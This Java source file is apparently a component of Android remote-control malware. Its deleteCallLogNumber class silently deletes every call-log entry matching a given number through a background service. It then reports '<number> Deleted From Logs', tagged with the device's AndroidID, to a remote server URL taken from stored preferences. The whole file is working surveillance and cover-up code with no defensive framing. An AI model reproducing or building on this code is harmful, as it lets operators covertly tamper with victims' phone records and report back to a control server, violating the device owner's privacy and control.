package u.can.i.up.expert.utils;

import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.CallLog;

import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class deleteCallLogNumber extends AsyncTask<String, Void, String> {
    String i = "";
    public deleteCallLogNumber(String i) {
        this.i = i;
    }
    @Override
    protected String doInBackground(String... params) {
        try {
            String strNumberOne[] = {i};
            Cursor cursor = DataSet.getInstance().myService.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
            boolean bol = cursor.moveToFirst();
            if (bol) {
                do {
                    int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
                    DataSet.getInstance().myService.getContentResolver().delete(Uri.withAppendedPath(CallLog.Calls.CONTENT_URI, String.valueOf(idOfRowToDelete)), "", null);
                } while (cursor.moveToNext());
            }
        } catch (Exception ex) {
            System.out.print("Exception here ");
        }
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", i + " Deleted From Logs");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }
    @Override
    protected void onPreExecute() {}
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
